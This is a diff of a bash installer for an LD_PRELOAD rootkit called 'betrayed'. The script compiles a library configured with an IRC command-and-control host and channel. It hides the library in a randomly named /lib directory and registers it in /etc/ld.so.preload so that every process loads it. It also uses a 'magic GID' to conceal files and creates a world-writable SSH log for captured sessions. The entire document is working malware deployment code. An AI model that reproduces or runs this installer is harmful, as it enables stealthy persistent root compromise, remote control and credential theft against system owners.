@@ -1,50 +1,91 @@
 #!/bin/bash
 
-# nothing to really see here
-[ $(id -u) != 0 ] && [ -z $COMPILE_ONLY ] && exit
-usage(){ echo "$0 irc.host \"#channel\""; exit; }
-[ -z "$1" ] && usage
-[ -z "$2" ] && usage
+[ -f .ascii ] && cat .ascii
+[ `id -u` != 0 ] && [ -z $COMPILE_ONLY ] && { echo "  [-] Not root."; exit; }
+usage(){ echo "  [..] usage: $0 <host> '<channel>'"; exit; }
+[ -z $1 ] && usage;
+[ -z $2 ] && usage;
 
-# get meeeee config
+# comment this out/change to 0 and we won't create the fork
+# process straight away.
+FORK_IMMEDIATELY=1
+
+CONF_H="src/config.h"
+PRELOAD="/etc/ld.so.preload"
+
 HOST="$1"
 CHANNEL="$2"
-[ -z $NICK ] && NICK="$(cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1)"
-[ -z $MGID ] && MGID=$(cat /dev/urandom | tr -dc '1-9' | fold -w 6 | head -n 1)
-[ -z $INSTALL_DIR ] && INSTALL_DIR="/lib/betrayed.$NICK"
-[ -z $SSH_LOGS ] && SSH_LOGS="$INSTALL_DIR/betrayed_ssh"
-[ -z $HIDDEN_PORTS ] && HIDDEN_PORTS="$INSTALL_DIR/hidden_ports"
 
-# config meeeee
-sed -i "s:??HOST??:$HOST:" config.h
-sed -i "s:??CHANNEL??:$CHANNEL:" config.h
-sed -i "s:??NICK??:$NICK:" config.h
-sed -i "s:??MGID??:$MGID:" config.h
-sed -i "s:??INSTALL_DIR??:$INSTALL_DIR:" config.h
-sed -i "s:??SSH_LOGS??:$SSH_LOGS:" config.h
+random_name(){ # $1 = desired length of name
+    local names name name_length
+    names=(`cat src/names.txt`)
+    name_length=$1
 
-# compile meeeeee
-cf="betrayed.c"
-so="betrayed.so.`uname -m`"
-rm -rf *.so.*
-LFLAGS="-ldl"
-WFLAGS="-Wall"
-FFLAGS="-fomit-frame-pointer -fPIC"
-gcc -std=gnu99 $cf -O0 $WFLAGS $FFLAGS -shared $LFLAGS -Wl,--build-id=none -o $so
-strip $so || { echo "couldn't strip lib, exiting"; exit; }
-cp config.bak.h config.h
+    name=${names[$RANDOM % ${#names[@]}]}
+    while [ ${#name} -gt $name_length ]; do name=${name::${#name}-1}; done
+    while [ ${#name} -lt $name_length ]; do name+="`cat /dev/urandom | tr -dc 'a-z' | fold -w 1 | head -n 1`"; done
 
-[ ! -z $COMPILE_ONLY ] && exit
+    echo -n "$name"
+}
 
-# setup meeee
-# no magic environment variable this time 'round so
-# we gotta set it all up before preloading the lib.
-mkdir -p $INSTALL_DIR && chown 0:$MGID $INSTALL_DIR
-if [ -d $INSTALL_DIR ]; then
-    mv $so $INSTALL_DIR/$so && chown 0:$MGID $INSTALL_DIR/$so
-    touch $SSH_LOGS && chmod 666 $SSH_LOGS && chown 0:$MGID $SSH_LOGS
-    touch $HIDDEN_PORTS && chown 0:$MGID $HIDDEN_PORTS
-    touch /etc/ld.so.preload && chown 0:$MGID /etc/ld.so.preload
-    echo $INSTALL_DIR/$so > /etc/ld.so.preload && echo "we pimpin"
-    cat /dev/null # start a process so we can fork straight away
-fi
+[ -z $NICK ] && NICK="`cat /dev/urandom | tr -dc 'A-Za-z' | fold -w 8 | head -n 1`"
+[ -z $MAGIC_GID ] && MAGIC_GID=`cat /dev/urandom | tr -dc '1-9' | fold -w 5 | head -n 1`
+
+RANDOM_NAME="`random_name 7`"
+[ -z $INSTALL_DIR ] && INSTALL_DIR="/lib/$RANDOM_NAME"
+[ -z $SSH_LOGS ] && SSH_LOGS="$INSTALL_DIR/`random_name 5`"
+[ -z $SONAME ] && SONAME="lib$RANDOM_NAME.so"
+[ -z $SOPATH ] && SOPATH="$INSTALL_DIR/$SONAME"
+
+hidepath(){ chown -h 0:$MAGIC_GID $1; }
+
+writeconf(){
+    cp $CONF_H ${CONF_H}.bak
+    sed -i "s:_HOST_:$HOST:" $CONF_H
+    sed -i "s:_CHANNEL_:$CHANNEL:" $CONF_H
+    sed -i "s:_NICK_:$NICK:" $CONF_H
+    sed -i "s:_MAGIC_GID_:$MAGIC_GID:" $CONF_H
+    sed -i "s:_INSTALL_DIR_:$INSTALL_DIR:" $CONF_H
+    sed -i "s:_SSH_LOGS_:$SSH_LOGS:" $CONF_H
+    sed -i "s:_SONAME_:$SONAME:" $CONF_H
+    sed -i "s:_SOPATH_:$SOPATH:" $CONF_H
+}
+
+compile_lib(){
+    echo "  [..] configuring rootkit"
+    writeconf
+
+	echo "  [..] compiling rootkit"
+	rm -rf *.so
+	local LFLAGS="-ldl"
+	local WFLAGS="-Wall"
+	local FFLAGS="-fomit-frame-pointer -fPIC"
+	gcc -std=gnu99 src/betrayed.c -O0 $WFLAGS $FFLAGS -shared $LFLAGS -Wl,--build-id=none -o $SONAME
+    mv ${CONF_H}.bak $CONF_H
+	strip -s $SONAME || { echo "  [-] couldn't strip $SONAME, exiting."; exit; }
+	echo "  [+] rootkit compiled. ($SONAME $(ls -lhN $SONAME | awk '{ print $5 }'))"
+}
+
+install_btrayed(){
+	echo "  [..] installing & setting up rootkit"
+	mkdir -p $INSTALL_DIR || { echo " [-] failure making installation directory"; exit; }
+
+    hidepath $INSTALL_DIR
+    mv $SONAME $SOPATH && hidepath $SOPATH
+    touch $SSH_LOGS && chmod 666 $SSH_LOGS && hidepath $SSH_LOGS
+    touch $PRELOAD && hidepath $PRELOAD
+
+    echo $SOPATH > $PRELOAD || { echo "  [-] couldn't write \$SOPATH to $PRELOAD"; exit; }
+    [ "$FORK_IMMEDIATELY" == 1 ] && cat /dev/null # start fork process now
+
+    echo "  [+] betrayed successfully installed"
+    echo "  [+] eee $HOST ($CHANNEL)"
+}
+
+echo "  [+] host: $HOST"
+echo "  [+] channel: $CHANNEL"
+echo "  [+] nick: $NICK"
+echo "  [+] magic GID: $MAGIC_GID"
+
+compile_lib
+[ -z $COMPILE_ONLY ] && install_btrayed
